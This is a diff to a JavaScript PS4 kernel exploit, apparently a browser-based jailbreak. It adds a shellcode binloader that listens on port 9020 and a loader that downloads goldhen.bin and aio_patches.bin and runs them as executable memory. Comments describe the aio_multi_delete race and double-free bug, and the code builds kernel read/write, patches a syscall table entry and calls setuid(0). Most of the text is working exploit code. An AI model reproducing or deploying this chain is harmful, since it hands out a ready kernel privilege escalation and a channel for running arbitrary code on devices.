@@ -62,62 +62,6 @@ const [is_ps4, version] = (() => {
     return [is_ps4, version];
 })();
 
-function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
-    
-function array_from_address(addr, size) {
-   var og_array = new Uint32Array(0x1000);
-    var og_array_i = mem.addrof(og_array).add(0x10);
-    mem.write64(og_array_i, addr);
-    mem.write32(og_array_i.add(0x8), size);
-    mem.write32(og_array_i.add(0xC), 0x1);
-    nogc.push(og_array);
-    return og_array;
-}
-
-function toogle_payload(PLfile) {
- var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
- var tmpStubArray = array_from_address(loader_addr, 1);
- tmpStubArray[0] = 0x00C3E7FF;
- var req = new XMLHttpRequest();
- req.responseType = "arraybuffer";
- req.open('GET',PLfile);//'goldhen.bin'
- req.send();
- req.onreadystatechange = function () {
-  if (req.readyState == 4) {
-   var PLD = req.response;
-   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
-   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
-   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-   tmp.set(new Uint8Array(req.response), 0);
-   tmp.set(padding, req.response.byteLength);
-   var shellcode = new Uint32Array(tmp.buffer);
-   pl.set(shellcode,0);
-   var pthread = malloc(0x10);
-   call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-   }
- };
-}
-
-function Exploit_done(){
- showMessage("Exploit y GoldHEN Activado!"),
- toogle_payload('goldhen.bin');
-}
-
 // sys/socket.h
 const AF_UNIX = 1;
 const AF_INET = 2;
@@ -194,6 +138,11 @@ const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
+
+//Payload_Loader
+ const PROT_READ = 1;
+ const PROT_WRITE = 2;
+ const PROT_EXEC = 4;
 
 let chain = null;
 var nogc = [];
@@ -541,6 +490,51 @@ function make_aliased_rthdrs(sds) {
     die(`failed to make aliased rthdrs. size: ${hex(size)}`);
 }
 
+// summary of the bug at aio_multi_delete():
+//
+// void
+// free_queue_entry(struct aio_entry *reqs2)
+// {
+//     if (reqs2->ar2_spinfo != NULL) {
+//         printf(
+//             "[0]%s() line=%d Warning !! split info is here\n",
+//             __func__,
+//             __LINE__
+//         );
+//     }
+//     if (reqs2->ar2_file != NULL) {
+//         // we can potentially delay .fo_close()
+//         fdrop(reqs2->ar2_file, curthread);
+//         reqs2->ar2_file = NULL;
+//     }
+//     free(reqs2, M_AIO_REQS2);
+// }
+//
+// int
+// _aio_multi_delete(
+//     struct thread *td,
+//     SceKernelAioSubmitId ids[],
+//     u_int num_ids,
+//     int sce_errors[])
+// {
+//     // ...
+//     struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
+//     // ...
+//     u_int rem_ids = obj->ao_rem_ids;
+//     if (rem_ids != 1) {
+//         // BUG: wlock not acquired on this path
+//         obj->ao_rem_ids = --rem_ids;
+//         // ...
+//         free_queue_entry(obj->ao_entries[req_idx]);
+//         // the race can crash because of a NULL dereference since this path
+//         // doesn't check if the array slot is NULL so we delay
+//         // free_queue_entry()
+//         obj->ao_entries[req_idx] = NULL;
+//     } else {
+//         // ...
+//     }
+//     // ...
+// }
 function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     const sce_errs = new View4([-1, -1]);
     const thr_mask = new Word(1 << main_core);
@@ -570,7 +564,20 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     const pthr = spawn_thread(thr);
     const thr_tid = pthr.read32(0);
 
+    // pthread barrier implementation:
+    //
+    // given a barrier that needs N threads for it to be unlocked, a thread
+    // will sleep if it waits on the barrier and N - 1 threads havent't arrived
+    // before
+    //
+    // if there were already N - 1 threads then that thread (last waiter) won't
+    // sleep and it will send out a wake-up call to the waiting threads
+    //
+    // since the ps4's cores only have 1 hardware thread each, we can pin 2
+    // threads on the same core and control the interleaving of their
+    // executions via controlled context switches
 
+    // wait for the worker to enter the barrier and sleep
     while (thr.retval_int === 0) {
         sys_void('sched_yield');
     }
@@ -952,7 +959,6 @@ function leak_kernel_addrs(sd_pair) {
 }
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
-
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
     for (let loop = 0; loop < num_alias; loop++) {
@@ -988,6 +994,7 @@ function make_aliased_pktopts(sds) {
     }
     die('failed to make aliased pktopts');
 }
+
 
 function double_free_reqs1(
     reqs1_addr, kbuf_addr, target_id, evf, sd, sds,
@@ -1460,7 +1467,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // RESTORE: clean corrupt pointer
      // pktopts.ip6po_rthdr = NULL
      //ABC Patch
-     const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
+     const off_ip6po_rthdr = 0x68;
      const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
      const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
      kmem.write64(r_rthdr_p, 0);
@@ -1503,6 +1510,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1591,10 +1601,16 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('setuid(0)');
     sysi('setuid', 0);
-    //showMessage("GoldHen Loaded Successfully !..."),    
     log('kernel exploit succeeded!');
-    //Exploit_done();
-    //alert("kernel exploit succeeded!");
+    log('restore sys_aio_submit()');
+    kmem.write32(sysent_661, sy_narg);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_661.add(8), sy_call);
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
+    localStorage.ExploitLoaded="yes"
+    sessionStorage.ExploitLoaded="yes";
+   //alert("kernel exploit succeeded!");
 }
 
 
@@ -1628,6 +1644,48 @@ function setup(block_fd) {
     return [block_id, groom_ids];
 }
 
+function runBinLoader() {
+    var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    var payload_loader = malloc32(0x1000);
+    var BLDR = payload_loader.backing;
+    BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
+    BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
+    BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
+    BLDR[9]  = 0x0001BE00;  BLDR[10] = 0xD2310000;  BLDR[11] = 0x00009CE8;
+    BLDR[12] = 0xC7894100;  BLDR[13] = 0x8D48C789;  BLDR[14] = 0xBA082474;
+    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8;  BLDR[17] = 0xFF894400;
+    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800;  BLDR[20] = 0x89440000;
+    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2;  BLDR[23] = 0x89410000;
+    BLDR[24] = 0x2C8B4CC6;  BLDR[25] = 0x45C64124;  BLDR[26] = 0x05EBC300;
+    BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
+    BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
+    BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
+    BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
+    BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
+    BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
+    BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
+    BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
+    BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
+    BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
+    BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
+    BLDR[60] = 0xC3050FCA;
+
+    chain.sys('mprotect', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+    var pthread = malloc(0x10);
+    sysi('mlock', payload_buffer, 0x300000);
+
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        payload_loader,
+        payload_buffer
+    );
+
+    log('BinLoader is ready. Send a payload to port 9020 now');
+}
+
 // overview:
 // * double free a aio_entry (resides at a 0x80 malloc zone)
 // * type confuse a evf and a ip6_rthdr
@@ -1644,16 +1702,18 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
-    // If setuid is successful, we dont need to run the kexploit again
-    try {
-        if (sysi('setuid', 0) == 0) {
-            log("Not running kexploit again.");
-            Exploit_done();
-            return;
+     try {
+        chain.sys('setuid', 0);
         }
+    catch (e) {
+        localStorage.ExploitLoaded = "no";
     }
-    catch (e) {}
-
+    
+     if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+           runBinLoader();
+            return new Promise(() => {});
+      }
+ 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
@@ -1707,9 +1767,7 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
-                
-        log('\nSTAGE: Exploit done');
-        Exploit_done();
+        
     } finally {
         close(unblock_fd);
 
@@ -1730,4 +1788,85 @@ export async function kexploit() {
         close(sd);
     }
 }
-setTimeout(kexploit, 1500);
+
+
+function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
+
+function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
+function array_from_address(addr, size) {
+   var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
+
+function PayloadLoader(Pfile)
+{
+    var loader_addr = chain.sysp(
+  'mmap',
+  new Int(0, 0),                         
+  0x1000,                               
+  PROT_READ | PROT_WRITE | PROT_EXEC,    
+  0x41000,                              
+  -1,
+  0
+);
+
+ var tmpStubArray = array_from_address(loader_addr, 1);
+ tmpStubArray[0] = 0x00C3E7FF;
+
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET',Pfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   var PLD = req.response;
+   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        loader_addr,
+        payload_buffer,
+    );	
+   }
+ };
+
+
+}
+
+kexploit().then(() => {
+
+//Load ABC fix as a regular Payload
+setTimeout(PayloadLoader("aio_patches.bin"),500);
+log("AIO Fixes Applied.!");
+//Load GoldHEN :)
+setTimeout(PayloadLoader("goldhen.bin"),500);
+log("GoldHEN Loaded.!");
+
+})
